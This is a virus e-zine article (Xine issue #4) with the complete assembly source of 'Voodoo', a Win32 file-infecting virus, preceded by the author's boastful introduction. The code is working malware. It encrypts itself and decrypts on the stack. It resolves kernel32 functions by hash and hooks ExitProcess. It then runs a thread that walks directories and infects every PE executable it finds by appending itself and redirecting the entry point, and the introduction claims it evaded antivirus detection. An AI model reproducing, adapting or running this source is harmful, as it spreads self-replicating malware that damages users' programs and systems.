   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 201 |
   ;                                        \-----------------------------/

   ;
   ;
   ; - The Voodoo virus
   ;
   ; I made this virus in octobre or november, I had all prototype working in
   ; different sources, I had finished a directory tree so I decided to mix them
   ; in one virus.
   ;
   ; This virus was more a coding challenge than everything, 1st, I made a very
   ; small infection procedure (as a simple PE infector, it took just 500 bytes)
   ; 2st I mixed with it the directory scanner. But It took so much time.
   ;
   ; I decided to add the CreateThread technology becoz multitasking open the way
   ; of flooding the user. Each time Voodoo run, it infect a lot of PEs in
   ; hardrive. Voodoo wait 5 sec before running, waiting that the game or program
   ; was initialized. It don't close FF/FN handle coz it can speed up other
   ; voodoos
   ;
   ; The problem is that the Tread finish with the program, so Voodoo hook
   ; ExitProcess and wait for finishing activities
   ;
   ; against windows message of modified programs I decided to make the windows
   ; directory by default as a three scanning.
   ;
   ; I had the option of puting a polymorphic in it, at that time, I hadn't
   ; developed any poly for win32 so I puted an encryption that put the virus to
   ; stack and decrypt it over there. From stack, it allocate memory and go there
   ; I did that to remember DOS viruses time.
   ;
   ; I did a lot of debug about all these techs, the virus is kinda uncrashable,
   ; very stable but don't work on the NT station. I modified it to get working
   ; on it but didn't like the morphology of voodoo coz it's not the same spirit
   ; This virus have something exceptional, so I decided to put the original
   ; version
   ;
   ;                       Magic voodoo - VOOOOOODOOOo!
   ;
   ; As you can notice, AVP were fool at some point, I mailed them and tell them
   ; their error, nothing was changed. If my voice is not heard, then I will not
   ; help them anymore in the future pffff....
   ;

   .386
   locals
   .model flat

   ;extrn           ExitProcess:Proc

   .data                           ; shits for tasm

   label_name: db 'StarZero virus prototype 3 - Voodoo Viruses family'

   .code                                   ;executable code starts here

   HOST:
           jmp     start
   PSEUDOFIN:  push    0
   ;       call    ExitProcess

   start:
               db  068h
   returntohost:       dd  offset PSEUDOFIN

       pushad
       call    getdel                  ; get delta

   decrypt:

       sub esp,fin-start
       lea esi,[ebp+start]
       mov edi,esp
       mov ecx,starcrpt-start
       repz    movsb               ; copy virus to stack

       mov ecx,fin-starcrpt

       mov bl,byte ptr [ebp+starcrpt]  ; decrypt in stack the virus

   makeitfull:

       mov al,byte ptr [esi]
       xor al,bl
       mov byte ptr [edi],al
       inc     esi
       inc edi
       loop    makeitfull          ; do the decrypt boucle

   retrn:
       lea eax,[esp+FirstEntry-start]
       jmp eax                 ; jmp to virus in stack

   getdel:
       call    getdel2
   getdel2:
       pop ebp
       sub ebp,offset getdel2
       ret

   starcrpt:   db 0

   StartCrypt:

   FirstEntry:

           Call    InitApis            ; set all apis
       call    Alloc               ; alloc memory

       mov edi,eax
       lea esi,[ebp+start]
       mov ecx,fin-start
       repz    movsb
       lea eax,[eax+InitViralcode-start]
       jmp eax             ; drop it over there

   InitViralcode:

       call    getdel              ; get the delta

           mov     esi,dword ptr [ebp+startscan]
       mov edi,dword ptr [ebp+ImageBase]
           xor     edx,edx

   nexloop:                ; search for Kernel32.DLL Import dir.

       mov     eax,dword ptr [esi+12]
       lea eax,[edi+eax+4]

       mov ebx,eax
       cmp ebx,80000000h
       ja  fin0

       cmp dword ptr [eax],'23LE'      ; look for kernel32
       je  testExitProc

       inc edx
       add esi,20
       loop    nexloop
       jmp fin0

   testExitProc:               ; found ?

           mov     eax,dword ptr [ebp+ExitProcess0]
           mov     esi,dword ptr [esi+16]          ; now get the RVA of the
           lea     esi,[esi+edi-4]                 ; location of the import

   scannext0:                  ;
       add esi,4
       cmp dword ptr [esi],0
       je  fin0
       cmp dword ptr [esi],eax     ; detect when location = ExitP.
       jne     scannext0

           lea     eax,[ebp+ExitInterception]
       mov dword ptr [esi],eax     ; patch it

       lea eax,[ebp+Identifier]
       push    eax
       push    0
       push    0
       lea eax,[ebp+Viralcode]     ; init our virus as new
       push    eax             ; taks
       push    0
       push    0
       call    dword ptr [ebp+CreateThread0]

   fin0:

           add     esp,fin-start
       popad
       ret                 ; return to host!

   Identifier: dd  0

   ExitInterception:

           call    getdel

   waitforsynchronic:

           cmp     byte ptr [ebp+synchronicflag],66    ; wait for virus
           jne     waitforsynchronic           ; terminaison

           call    dword ptr [ebp+ExitProcess0]
           ret

   Viralcode:

       call    getdel
           call    GetTime

       cmp byte ptr [ebp+synchronicflag],69    ; for 1st run
       jz  skipwait

       mov byte ptr [ebp+synchronicflag],66    ; set as not finished

       mov ax,word ptr [ebp+WDSec]
       add ax,5
       cmp ax,60
       jna skfx
       sub ax,60
   skfx:   push    eax
       call    GetTime                 ; wait 5 sec
       pop eax
       cmp word ptr [ebp+WDSec],ax
       jna skfx

   skipwait:
       mov byte ptr [ebp+synchronicflag],0

       and dword ptr [ebp+dirflag],0

           mov     ax,word ptr [ebp+WMil]

           and     al,00000010b
           cmp     al,10b                  ; look for sec
           je      scanwindir              ; if okay then attack
                               ; all wins
           mov     word ptr [ebp+currbuff2],'\'

       lea eax,[ebp+currbuff2]
       push    eax
       push    eax
       push    260
           call    dword ptr [ebp+GetCurrDir]      ; get current dir

       pop eax

   finishthat:

       inc eax
   ;   cmp byte ptr [eax],0
   ;   je  returntohost
       cmp byte ptr [eax],'\'
       jne finishthat
       mov byte ptr [eax],0

           mov     al,byte ptr [ebp+WDSec]
       and al,1b
           cmp     al,1b
           je      scandirit

           inc     byte ptr [ebp+dirflag]
       jmp scandirit

   scanwindir:

       lea     esi,[ebp+programdir]
       lea edi,[ebp+currbuff2]
       mov eax,edi
       mov ecx,endpgm-programdir
       repz    movsb               ; scan program directory

   scandirit:

       call    scanalldir
       mov byte ptr [ebp+synchronicflag],66

       push    0
       call    dword ptr [ebp+ExitThread0]

   scanalldir:

       lea eax,[ebp+currbuff2]
       mov esi,eax
       Call    GetFirstDir         ; get 1st directory
       push    eax
       test    eax,eax
       jz  uptoback            ; nothing then go upper dir
       pop eax
       dec     eax
       push    eax
       call    scanexes

   scannext:
       lea edi,[ebp+currbuff2]
       mov eax,edi

       scanit:
       inc edi
       cmp byte ptr [edi],0
       jne scanit

   lovesex:
       dec edi
       cmp byte ptr [edi],'\'
       jne lovesex                 ; fix up dir and every
                               ; thing
       inc edi
       lea esi,[ebp+returned+2Ch]

   copyit:
       movsb
       cmp byte ptr [esi],0
       jnz copyit

       movsb
       cmp byte ptr [esi-2],'.'
       je  loopback2               ; if . or .. then don't
                               ; scan
       cmp byte ptr [ebp+dirflag],1        ; check if recursive
       je  makeitnormal

       cmp word ptr [ebp+currbuff2+3],'IW'     ; look if windows
       je  noiseit

       push    edi esi
       call    makescandir             ; make scannable dir
       call    scanexes                ; scan exe
       pop esi edi
       mov byte ptr [esi],0

       cmp byte ptr [ebp+dirflag],0
           je      skipscanalldir

   makeitnormal:

       call    scanalldir              ; scan all sub dir
       jmp scanfixit

   noiseit:

       push    dword ptr [ebp+dirflag]
       mov byte ptr [ebp+dirflag],1
       call    scanalldir              ; scan all subdir if
       pop dword ptr [ebp+dirflag]         ; windows or other...
       jmp scanfixit

   skipscanalldir:
   loopback:

       dec edi
       cmp byte ptr [edi],'\'          ; fix compatibility
       jne loopback                ; between strcuture

   loopback2:
       dec edi
       cmp byte ptr [edi],'\'          ; and received datas
       jne loopback2

       mov dword ptr [edi+1],' .*'

   scanfixit:

       pop eax

   scanthat:

       push    eax
       call    GetNextDir              ;get the next directory
       test    eax,eax
       jz  uptoback
       jmp scannext

   uptoback:

       pop eax
       lea eax,[ebp+currbuff2]

   testit0:
       inc eax
       cmp byte ptr [eax],0
       jne testit0

   testit22:
       dec eax
       cmp byte ptr [eax],'\'
       jne testit22

   testit222:
       dec eax
       cmp byte ptr [eax],'\'
       jne testit222

       mov     dword ptr [eax+1],' .*'     ; a trick to get dirs only on
                           ; win95/98
       ret

   GetFirstDir:

       call    makescandir
       lea eax,[ebp+returned]
       push    eax
       push    esi
           Call    dword ptr [ebp+FindFirst]

       inc eax             ; get directory
       ret

   makescandir:
       lea esi,[ebp+currbuff2]
       push    esi
   diroz1:
       inc     esi
       cmp     byte ptr [esi],0
       jne     diroz1

       mov dword ptr [esi],' .*\'      ; check if we fixed it
       mov byte ptr [esi+4],0
       pop esi
       ret

   GetNextDir:

       lea esi,[ebp+returned]
       push    esi
       push    eax
       Call    dword ptr [ebp+FindNext]
       ret

   scanexes:

       sub esp,260+fin-start       ; reserve stack for memory
       mov edx,esp

       lea     eax,[ebp+currbuff2]
       push    eax

   doitmore:
       inc eax
       cmp byte ptr [eax],0
       jne doitmore

       dec eax
       mov dword ptr [eax],'exe'           ; add exe to '*. '
       dec eax
       dec eax
       mov dword ptr [ebp+offsetloc],eax

       pop eax
       push    edx

       push    edx
       push    eax

       call    dword ptr [ebp+FindFirst]       ; look if file exist
       inc eax
       test    eax,eax
       jz  finishiot
       dec eax
       push    eax

   startinfect:

       mov dl,byte ptr [esp+4+4+32+1]
       xor dl,69
       mov byte ptr [ebp+starcrpt],dl      ; low size equal crypt
                               ; val
       lea esi,[esp+4+4+2Ch]
       mov edi,dword ptr [ebp+offsetloc]
       xor ecx,ecx
       mov cl,95                   ;
       repz    movsb               ; copy the uncrypted part

       lea edx,[ebp+currbuff2]
       Call    CreateMapfile           ; map the file
       jz  finishit
       push    eax

       cmp byte ptr [eax],'M'          ; check exe
       jne CloseIt

       cmp byte ptr [eax+24],'@'           ; check win
       jne CloseIt

       mov edi,eax
       xor eax,eax
       mov ax,word ptr [edi+03Ch]
       lea esi,[eax+edi]

       cmp byte ptr [esi],'P'          ; check PE
       jne CloseIt

       cmp word ptr [esi+66],'S0'          ; check infected
       je  CloseIt

       xor ecx,ecx
       mov cx,word ptr [esi+6]         ; get numbers of
       dec cx                  ; sections
       xor eax,eax
   noozhere:
       or  dword ptr [esi+eax+0f8h+36],80000000h
       add eax,40
       loop    noozhere                ; make all sec writable

       lea ebx,[esi+eax+0f8h]

           mov     ecx,dword ptr [esi+52]

           mov     eax,dword ptr [esi+128]
           mov     dword ptr [ebp+startscan],eax           ; set for
           mov     dword ptr [ebp+ImageBase],ecx           ; getting value
           add     dword ptr [ebp+startscan],ecx

       mov eax,dword ptr [esi+40]
           add     eax,ecx
       mov dword ptr [ebp+returntohost],eax

       mov eax,dword ptr [ebx+20]          ; set the physical size
       add eax,dword ptr [ebx+16]
       push    eax
       sub eax,dword ptr [ebx+20]          ; we have physical size

       add eax,dword ptr [ebx+12]          ; add rva to physical
       mov dword ptr [esi+40],eax          ; and now we
       sub eax,dword ptr [ebx+12]

       mov ecx,dword ptr [esi+60]          ; fix image size
       add eax,fin-start
       call    divit
       mov dword ptr [ebx+16],eax

       mov eax,fin-start               ; set the virtual size
       mov ecx,dword ptr [esi+56]
       call    divit
       add dword ptr [ebx+8],eax
       or  dword ptr [ebx+36],0C0000020h       ; set last section as
                               ; loadable an code
       add dword ptr [esi+80],eax          ; refix image size
       mov word ptr [esi+66],'S0'

       pop edi
       Call    dword ptr [ebp+UnMap]           ; unmap the file

       push    edi
       push    dword ptr [ebp+MapHandle]
       Call    dword ptr [ebp+CloseHandle0]
       pop edi

       add edi,pseudofin-start         ; remap the file+
                               ; virus physical size
       Call    remapfile
       push    eax

       sub edi,pseudofin-start
       add edi,eax

       lea esi,[ebp+start]
       mov ecx,StartCrypt-start            ;
       repz    movsb                   ; drop the virus

       push    ebx
       mov ecx,pseudofin-StartCrypt
       mov bl,byte ptr [ebp+starcrpt]

   cryptit:
       mov al,byte ptr [esi]
       xor al,bl
       mov byte ptr [edi],al
       inc esi
       inc edi
       loop    cryptit                 ; and encrypt it

       pop ebx

   CloseIt:
       Call    dword ptr [ebp+UnMap]
       push    dword ptr [ebp+MapHandle]
       Call    dword ptr [ebp+CloseHandle0]        ; close map handles
       push    dword ptr [ebp+fhandle]
       Call    dword ptr [ebp+CloseHandle0]

       pop eax
       pop edx

       push    edx
       push    eax

       push    edx
       push    eax
       Call    dword ptr [ebp+FindNext]        ; check if any other
       test    eax,eax                 ; exe
       jnz     startinfect

   finishit:

       pop eax

   finishiot:

       pop eax
           add     esp,260+(fin-start)
           ret


   CreateMapfile:

       push    2                    ; iReadWrite = OF_READWRITE

       push    edx
       Call    dword ptr [ebp+Lopen]                     ; open the file
       mov edi,dword ptr [esp+4+4+4+20h]
       mov     dword ptr [ebp+fhandle],eax

   remapfile:

       mov eax,dword ptr [ebp+fhandle]
       push    0
       push    edi
       push    0
       push    4h
       push    0
       push    eax
           Call    dword ptr [ebp+CreateMap]
       mov dword ptr [ebp+MapHandle],eax       ; put the file in mem

       push    edi
       push    0
       push    0
       push    2h or 4h
       push    eax
       call    dword ptr [ebp+ViewMap]         ; ask to access that
       dec eax                 ; file
       inc eax

       ret

   GetTime:

           lea     eax,[ebp+TimeOffset]
           push    eax
           call    dword ptr [ebp+GetSysTime0]     ; get the time
           ret

   divit:                          ; for the pe values

   push edx
   push ebx

   xor edx,edx
   div ecx
   inc eax
   mul ecx

   pop ebx
   pop edx
   ret

   Alloc:                      ; Hacked from Explorer.exe
                           ; given with window95 Chicago

       mov ebx,fin-start
       inc ebx             ; ver 4.00.950 line#0040D0DE
           push    0
           push    ebx
       push    0
           Call    dword ptr [ebp+HeapCreate0] ; use heap for getting mem

           cmp     eax,0
           jz      AllocBad

       dec ebx
       push    ebx
       push    8h
           push    eax
           Call    dword ptr [ebp+HeapAlloc0]  ; alloc heaps

   AllocBad:
   ret

   InitApis:
   GetProc:

       call    getdel
       push    ebp
           mov     edi,dword ptr [esp+4+20h+4+fin-start+4]
   ;   and edi,0FFF00000h
   ;        cmp     edi,0BFF00000h
   ;        jb      kernelbase
           mov     edi,077F00000h-070000h      ; this was previewved for NT
                           ; but in fact don't work on NT
   kernelbase:

           add     edi,070000h
           mov     ebx,dword ptr [edi+3Ch]
           add     ebx,edi                         ; ebx point to the PE header
                                                   ; In fact it's allways PE
                           ; I skiped the MZ and PE
                           ; signature check coz if it's
                           ; not, Kernel can't be loaded :]
           mov     esi,dword ptr [ebx+120]         ; esi point to the Export
           lea     esi,[esi+edi]                   ; zone

           mov     ecx,dword ptr [esi+24]          ; ecx = number of export
           mov     ebx,dword ptr [esi+32]          ; ebx point to the name offset
           add     ebx,edi                         ; table

   Scanstring:


           mov     edx,dword ptr [ebx]             ; edi point to the 1st
           add     edx,edi                         ; name

   loophere:

       push    ecx

           xor     eax,eax
           xor     ecx,ecx             ; reset for crc building

           mov     al,byte ptr [edx]

   getnamecrc:

           mov     cl,byte ptr [edx]
           test    ecx,ecx
           jz      test_crcs           ; this build a Pseudo CRC
           rol     eax,3
           xor     eax,ecx
           inc     edx
           jmp     getnamecrc

   test_crcs:

       pop ecx
       push    ecx
       push    ebp

       inc edx
       lea ebp,[ebp+crc_list-4]        ; compare pseudos crc
       xor ebx,ebx
   doomed:
       add ebp,4
       cmp byte ptr [ebp],0        ; check for it
       je  testnext

       inc ebx
           cmp     dword ptr [ebp],eax
           jne     doomed

           mov     eax,dword ptr [esi+24]      ; get table of API offset
       sub eax,ecx
       shl eax,1

       push    ebx
           add     eax,dword ptr [esi+36]          ; table RVA
           add     eax,edi                         ; Add Rva
       xor ebx,ebx             ; set ebx to 0
       mov bx,word ptr [eax]       ;
       xchg    eax,ebx
       pop ebx

       shl eax,2

       add eax,dword ptr [esi+28]      ; calculation
       add eax,edi

       mov     eax,dword ptr [eax]
       add eax,edi
       dec     ebx

       pop ebp
       lea ecx,[4*ebx+GetSysTime0]     ; do it over system time
       mov dword ptr [ebp+ecx],eax
       push    ebp
   testnext:
       pop ebp
       pop ecx
       loop    loophere            ; scan every api requested

       pop     ebp
           ret

   programdir: db 'c:\program files',0
   ;programdir:    db 'f:\program files',0
   endpgm:

   db      db 'Star0/ikx/ - Magic Voodoo'

   ImageBase:  dd  00400000h
   startscan:  dd  00404000h

   sec_descriptor:

   dd      12
   dd      0
   dd      0

   crc_list:

       dd  0EE84C668h          ; GetSystemTime
       dd  0C6387A85h          ; CreateThread
       dd  00518D019h          ; HeapAlloc
       dd  028C67195h          ; HeapCreate
       dd  0A24E569Eh          ; GetCurrentDirectoryA
       dd  05FBCD23Ch          ; CreateMap
       dd  0D45D57C9h          ; ViewMap
       dd  0D456B049h          ; UnMap
       dd  056b3973Eh          ; FindFirst
       dd  0E37e8dc3h          ; FindNext
       dd  00AACF03Dh          ; Lclose -> Call to closeHandle
       dd  001558146h          ; Lopen
       dd  01CDC7E3Fh          ; ExitThread
           dd  0E6ff2c33h                      ; ExitProcess
       dd  0

   pseudofin:

   GetSysTime0:    dd      0
   CreateThread0:  dd  0
   HeapAlloc0: dd  0
   HeapCreate0:    dd  0
   GetCurrDir:     dd      0
   CreateMap:  dd  0
   ViewMap:    dd  0
   UnMap:      dd  0
   FindFirst:  dd  0
   FindNext:   dd  0
   CloseHandle0:   dd  0
   Lopen:      dd  0
   ExitThread0:    dd  0
   ExitProcess0:   dd      0
           dd  0

   MapHandle:  dd  0
   fhandle:        dd      0
   offsetloc:  dd  0
   synchronicflag: db      69
   dirflag:        dd  0

   returned:       db      400 dup (?)

   TimeOffset:

   WYear:          dw ?
   WMonth:         dw ?
   WDayWeek:       dw ?
   WDay:           dw ?
   WDHour:         dw ?
   WDMin:          dw ?
   WDSec:          dw ?
   WMil:           dw ?

   currbuff2:      db      295 dup (?)
   startfile:
   fin:
   ends
   end HOST
